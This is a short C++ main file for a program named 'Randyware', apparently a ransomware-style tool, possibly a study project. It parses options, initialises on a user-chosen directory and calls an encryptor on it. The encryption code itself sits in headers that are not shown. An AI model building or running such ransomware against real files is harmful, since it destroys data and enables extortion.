#include <unistd.h>

#include <cstdio>
#include <cstdlib>
#include <print>

#include "CLI/CLI.hpp"
#include "cli.hpp"
#include "randy.hpp"

using namespace Randy;

int main(int argc, char* argv[]) {
    Cli cli;
    CLI11_PARSE(cli.app, argc, argv);
    auto pid = getpid();
    std::println("[INFO] PID {}", pid);

    auto randy = Randyware::init(cli.randyArgs.directory);

    if (!randy.has_value()) {
        std::println("[Error] init randy");
        return EXIT_FAILURE;
    }
    std::println("[INFO] start encrypting...");
    randy->encryptor();
    std::print("[INFO] DONE. Enter anything to exit");
    getc(stdin);
    return EXIT_SUCCESS;
}
